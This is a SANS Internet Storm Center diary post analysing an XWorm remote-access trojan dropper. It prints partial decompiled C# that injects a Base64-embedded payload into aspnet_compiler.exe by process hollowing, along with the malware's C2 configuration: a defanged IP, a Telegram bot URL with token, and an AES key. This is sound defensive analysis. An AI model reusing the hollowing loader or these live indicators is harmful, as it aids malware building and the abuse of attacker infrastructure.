---
title: XWorm Hidden With Process Hollowing, (Thu, Jul 25th)
url: https://isc.sans.edu/diary/rss/31112
source: SANS Internet Storm Center, InfoCON: green
date: 2024-07-26
fetch_date: 2025-10-06T17:44:36.671444
---

# XWorm Hidden With Process Hollowing, (Thu, Jul 25th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31106)
* [next](/diary/31116)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [XWorm Hidden With Process Hollowing](/forums/diary/XWorm%2BHidden%2BWith%2BProcess%2BHollowing/31112/)

**Published**: 2024-07-25. **Last Updated**: 2024-07-25 07:21:58 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/XWorm%2BHidden%2BWith%2BProcess%2BHollowing/31112/#comments)

XWorm is not a brand-new malware family[[1](https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm)]. It's a common RAT (Remote Access Tool) re-use regularly in new campaigns. Yesterday, I found a sample that behaves like a dropper and runs the malware using the Process Hollowing technique[[2](https://attack.mitre.org/techniques/T1055/012/)]. The sample is called "[@](https://www.virustotal.com/gui/search/name%253A%2540Norman_is_back_RPE_v1.exe)Norman\_is\_back\_RPE\_v1.exe" (SHA256: dc406d626a9aac5bb918abf0799fa91ba6239fc426324fd8c063cc0fcb3b5428). It's a .Net executable that is, strangely, not obfuscated. It's possible to disassemble it with ilspycmd:

```

remnux@remnux:/MalwareZoo/20240723$ ilspycmd Norman_is_back_RPE_v1.exe >Norman_is_back_RPE_v1.exe.src
```

My next step in malware triage is to always have a look at potential chunks of Base64 data (which are pretty common):

```

remnux@remnux:/MalwareZoo/20240723$ base64dump.py Norman_is_back_RPE_v1.exe.src -n 50
ID  Size    Encoded          Decoded          md5 decoded
--  ----    -------          -------          -----------
 1:   50520 TVqQAAMAAAAEAAAA MZ.............. 642ad3e40b11c9623d3988f68818d7d5
```

The good news, the presence of "TVqQAA" reveals the presence of an embedded PE file[[3](https://isc.sans.edu/diary/Searching%2Bfor%2BBase64encoded%2BPE%2BFiles/22199)]. Here is the corresponding line in the code:

```

RPE1.Program.Run("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe", Convert.FromBase64String("TVqQAAMA ... AAAA=="), protect: false);
```

The aspnet\_compiler.exe binary is available if you have the .Net framework installed on your computer (as most Windows computers do).

Let's have a look at the RPE1.Program class. We can see a lot of references to interesting API calls:

```

namespace RPE1
{
    internal static class Program
    {
        private delegate int DelegateResumeThread(IntPtr handle);
        private delegate bool DelegateWow64SetThreadMIC4ME(IntPtr thread, int[] MIC4ME);
        private delegate bool DelegateSetThreadMIC4ME(IntPtr thread, int[] MIC4ME);
        private delegate bool DelegateWow64GetThreadMIC4ME(IntPtr thread, int[] MIC4ME);
        private delegate bool DelegateGetThreadMIC4ME(IntPtr thread, int[] MIC4ME);
        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool DelegateWriteProcessMemory(IntPtr process, int BA4ME, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool DelegateReadProcessMemory(IntPtr process, int BA4ME, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int BA4ME);
        private delegate bool DCPA_1(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
```

Do you see the "CPA\_1"? The attacker obfuscated the reference to CreateProcess() behind this name.

Otherwise, we can see all the required API calls to perform Process Hollowing:

1. Create a process in suspended mode
2. Wipe its memory
3. Allocate new memory in the empty process
4. Write the malicious payload
5. Resume the process

Here is the beginning of the RPE1.Program.Run class:

```

public static void Run(string path, byte[] PL4ME, bool protect)
{
    for (int i = 0; i < 5; i++)
    {
        int bytesRead = 0;
        StartupInformation startupInfo = default(StartupInformation);
        ProcessInformation processInformation = default(ProcessInformation);
        startupInfo.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
        try
        {
            if (!CPA_1(path, string.Empty, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 134217732u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
            {
                throw new Exception();
            }
            ...
            if (num2 == buffer && ZwUnmapViewOfSection(processInformation.ProcessHandle, buffer) != 0)
            {
                throw new Exception();
            }
            ...
            int num4 = VirtualAllocEx(processInformation.ProcessHandle, num2, length, 12288, 64);
            ...
```

CreateProcess(), CPA\_1 here, is used to create a new process with "path" being C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet\_compiler.exe). The second argument (PL4ME) contains the decoded Base64 data, the second stage. The result will be a process "aspnet\_compiler.exe" that will contain and run the malware.

Let's have a look at this second stage:

```

remnux@remnux:/MalwareZoo/20240723$ base64dump.py -n 50 Norman_is_back_RPE_v1.exe.src -s 1 -d >secondstage.exe
remnux@remnux:/MalwareZoo/20240723$ file secondstage.exe
secondstage.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

This PE file (SHA256: ccbdda883a1ab8170c280680e9f7af7e4001cec36f68773d0a9327991aaa0032). It uses the following C2 config:

```

{
    "c2": [
        "104[.]243[.]32[.]185:7000"
    ],
    "attr": {
        "telegram": "https://api[.]telegram[.]org/bot5112782641:AAEVhDgUqm4o4Ygqtq2_C3RuM_QdhcPC7is/sendMessage?chat_id=985608946",
        "install_file": "USB.exe"
    },
    "keys": [
        {
            "key": "aes_key",
            "kind": "aes.plain",
            "value": "9IvH+qReqJ212x6k9TOpTw=="
        }
    ],
    "rule": "Xworm",
    "mutex": [
        "nYYCvxHXYQfAQcPE"
    ],
    "family": "xworm",
    "version": "5.0"
}
```

[1] <https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm>
[2] <https://attack.mitre.org/techniques/T1055/012/>
[3] [https://isc.sans.edu/diary/Searching+for+Base64encoded+PE+Files/22199](https://isc.sans.edu/diary/Searching%2Bfor%2BBase64encoded%2BPE%2BFiles/22199)

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Hollowing](/tag.html?tag=Hollowing) [Injection](/tag.html?tag=Injection) [Malware](/tag.html?tag=Malware) [Process](/tag.html?tag=Process) [XWorm](/tag.html?tag=XWorm)

[0 comment(s)](/diary/XWorm%2BHidden%2BWith%2BProcess%2BHollowing/31112/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31106)
* [next](/diary/31116)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning...